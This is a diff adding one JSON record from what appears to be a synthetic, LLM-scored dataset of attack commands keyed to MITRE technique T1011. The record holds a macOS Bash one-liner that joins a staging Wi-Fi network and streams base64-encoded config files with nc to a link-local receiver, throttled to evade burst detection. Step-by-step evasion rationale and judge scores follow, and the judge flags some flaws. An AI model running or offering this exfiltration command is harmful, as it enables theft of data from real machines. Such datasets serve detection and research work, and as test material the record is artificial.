@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
+  "explanation": "Streams base64-encoded config data line-by-line over a separate Wi\u2011Fi SSID to an IPv6 link-local receiver on a high port, reducing burst signatures and using an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Ensure no active connection to monitored Wi\u2011Fi.",
+    "Join a staging SSID separate from the primary channel.",
+    "Compress and base64-encode the configs.",
+    "Throttle and send line-by-line over IPv6 link-local tied to en0 on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-80a90c22",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner is well-formed with balanced quotes, proper separators (&& and |), valid-looking options, and a correctly structured while loop.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly exfiltrates data over a separate Wi\u2011Fi SSID to an IPv6 link-local receiver using tar/base64/nc, but the -A option collapses base64 into a single line (defeating line-by-line throttling), networksetup likely needs sudo despite \u201cPrivilege: None,\u201d and the activity does not align with the provided System Script Proxy Execution description.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T20:58:58.642729Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
